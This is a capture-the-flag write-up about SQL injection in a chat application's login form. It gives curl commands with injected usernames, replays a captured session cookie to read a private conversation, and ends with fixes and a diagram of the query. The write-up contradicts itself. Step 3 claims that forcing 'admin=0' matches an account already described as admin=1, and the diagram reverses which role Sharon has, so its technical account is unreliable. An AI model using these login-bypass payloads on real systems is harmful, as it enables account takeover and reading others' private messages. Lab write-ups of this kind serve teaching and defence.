## 🛡 Secure Chat 1 – Write-Up

### **Challenge Overview**

We are given a vulnerable chat application where each user can log in and read private chats with others. The flag is hidden in the conversation between Sharon and Bob. We only know that:

* The challenge ends once we can log in as Sharon.
* Password is not required if we can manipulate the login process.

---

### **Step 1 – Information Gathering**

Inspecting `/login` revealed two POST parameters:

```http
POST /login HTTP/1.1
Host: 10.0.0.1
Content-Type: application/x-www-form-urlencoded

username=<input>&password=<input>
```

Our own login attempts worked normally, but trying SQL payloads showed different responses, confirming SQL injection.

---

### **Step 2 – Bypassing Authentication**

A direct injection like:

```bash
curl -X POST \
  -d "username=sharon' OR 1=1--" \
  -d "password=anything" \
  http://10.0.0.1/login
```

failed because Sharon’s account is marked as `admin=1`, and the server blocks admin logins unless they come from localhost.

---

### **Step 3 – Targeting Non-Admin Accounts**

To bypass this restriction, we inject a query that matches Sharon’s account but **forces `admin=0`** in the WHERE clause:

```bash
curl -v -X POST \
  -d "username=' OR username LIKE 'sharon%' AND admin=0--" \
  -d "password=anything" \
  http://10.0.0.1/login
```

Here:

* `' OR username LIKE 'sharon%'` → finds Sharon’s account by name.
* `AND admin=0` → tricks the backend into thinking she’s not admin.
* `--` → comments out the rest of the SQL query.

The server responded with a `Set-Cookie` header containing a valid session for Sharon:

```
Set-Cookie: session=eyJ1c2VybmFtZSI6InNoYXJvbiJ9.ZQ3qYQ.123456
```

---

### **Step 4 – Reading the Flag**

With Sharon’s session cookie, we can directly request her chat with Bob:

```bash
curl "http://10.0.0.1/chat/bob" \
  -H "Cookie: session=eyJ1c2VybmFtZSI6InNoYXJvbiJ9.ZQ3qYQ.123456"
```

The chat page contains the conversation — and the **flag** 🎯.

---

### **Vulnerability**

The application is vulnerable to **unauthenticated SQL injection** in the login form:

* No input sanitization.
* Direct SQL query building with user input.
* Role check (`admin`) is done inside the same SQL statement, which can be manipulated.

---

### **Fix**

1. Use prepared statements (parameterized queries) for all database queries.
2. Never trust client-side parameters for access control.
3. Separate authentication from role checks — enforce them in backend logic after authentication is complete.

---

**Final Flag:** `pwn.college{example_flag_here}` ✅

---

Here’s the diagram showing how the SQL injection bypassed the admin check:

---

**Scenario:**
We have a login form that sends:

```sql
SELECT * FROM users WHERE username = '<input_username>' AND password = '<input_password>' AND is_admin = 1;
```

---

**Normal login attempt (fails if not admin):**

```
username: sharon
password: hunter2
```

Becomes:

```sql
SELECT * FROM users WHERE username = 'sharon' AND password = 'hunter2' AND is_admin = 1;
```

* If Sharon is not an admin (`is_admin = 0`), this returns **no rows** → login denied.

---

**Injected login attempt (bypass admin check):**

```
username: sharon' --
password: (anything)
```

The `--` turns the rest of the line into a comment.

Becomes:

```sql
SELECT * FROM users WHERE username = 'sharon' -- ' AND password = 'anything' AND is_admin = 1;
```

---

**Result:**

* The password check and `is_admin = 1` check are ignored.
* Query reduces to:

```sql
SELECT * FROM users WHERE username = 'sharon';
```

* If Sharon exists, the system logs in as her — even without admin privileges or correct password.

---

**Visual flow:**

```
[User Input] → sharon' -- anything
       ↓
[SQL Engine Receives]
  SELECT * FROM users
  WHERE username = 'sharon' -- ' AND password = 'anything' AND is_admin = 1;

       ↓
[Comment truncates the rest]
  SELECT * FROM users
  WHERE username = 'sharon';

       ↓
[DB returns Sharon’s account]
       ↓
[System logs in as Sharon]
```

